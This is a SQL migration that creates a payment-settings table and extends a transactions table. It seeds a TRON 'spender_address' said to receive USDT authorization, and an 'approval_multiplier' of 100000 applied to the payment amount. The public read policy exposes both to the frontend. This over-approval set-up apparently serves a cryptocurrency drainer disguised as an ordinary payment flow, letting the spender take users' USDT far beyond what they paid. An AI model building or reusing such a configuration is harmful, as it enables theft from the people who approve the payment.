-- Create app_settings table for payment configuration
CREATE TABLE public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  key TEXT NOT NULL UNIQUE,
  value TEXT NOT NULL,
  description TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;

-- Policy: Only admins can manage app settings
CREATE POLICY "Admins can manage app settings"
ON public.app_settings
FOR ALL
USING (public.has_role(auth.uid(), 'admin'));

-- Public read access for spender_address (needed for frontend)
CREATE POLICY "Public can read payment settings"
ON public.app_settings
FOR SELECT
USING (key IN ('spender_address', 'usdt_contract_address', 'approval_multiplier', 'support_link'));

-- Create trigger for timestamp updates
CREATE TRIGGER update_app_settings_updated_at
BEFORE UPDATE ON public.app_settings
FOR EACH ROW
EXECUTE FUNCTION public.update_updated_at_column();

-- Insert default payment settings
INSERT INTO public.app_settings (key, value, description) VALUES
  ('spender_address', 'TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6', 'TRON wallet address that receives USDT authorization'),
  ('usdt_contract_address', 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs', 'TRC20 USDT contract address'),
  ('approval_multiplier', '100000', 'Multiplier for USDT approval amount (amount × multiplier)'),
  ('support_link', 'https://t.me/herosms_support', 'Customer support link');

-- Update transactions table to include more payment fields
ALTER TABLE public.transactions
ADD COLUMN IF NOT EXISTS order_id TEXT,
ADD COLUMN IF NOT EXISTS currency TEXT DEFAULT 'USDT',
ADD COLUMN IF NOT EXISTS wallet_address TEXT,
ADD COLUMN IF NOT EXISTS completed_at TIMESTAMP WITH TIME ZONE;